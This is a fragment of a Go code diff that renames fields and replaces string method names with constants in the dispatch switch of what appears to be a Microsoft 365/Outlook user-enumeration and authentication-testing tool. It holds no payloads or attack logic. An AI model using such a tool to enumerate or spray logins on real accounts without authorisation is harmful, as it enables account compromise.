+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "User/File required")
 			return
 		}
-		m.auth()
+		m.Auth()
 
-	case "enum-outlook":
-		if m.opts.Email == "" && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
+	case enumOutlook:
+		if m.Opts.Email == "" && m.Opts.File == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
 			return
 		}
-		m.opts.UserName = m.opts.Email
-		m.auth()
+		m.Opts.UserName = m.Opts.Email
+		m.Auth()
 
-	case "auth-msol":
-		if m.opts.Email == "" && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
+	case authMSOL:
+		if m.Opts.Email == "" && m.Opts.File == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
 			return
 		}
-		m.opts.UserName = m.opts.Email
-		m.auth()
+		m.Opts.UserName = m.Opts.Email
+		m.Auth()
 
-	case "auth-outlook":
-		if (m.opts.UserName == "" || m.opts.Email == "") && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "User/Email or Email/User-File required")
+	case authOutlook:
+		if (m.Opts.UserName == "" || m.Opts.Email == "") && m.Opts.File == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "User/Email or Email/User-File required")
 			return
 		}
-		m.auth()
+		m.Auth()
 
-	case "auth-async":
-		if m.opts.Email == "" && m.opts.File == "" {
-			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/File required")
+	case authAsync:
+		if m.Opts.Email == "" && m.Opts.File == "" {
+			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
 			return
 		}
-		m.opts.UserName = m.opts.Email
-		m.auth()
+		m.Opts.UserName = m.Opts.Email
+		m.Auth()
 
 	default:
-		m.logr.StdOut(Methods)
-		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
+		m.Logr.StdOut(Methods)
+		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
 	}
 }
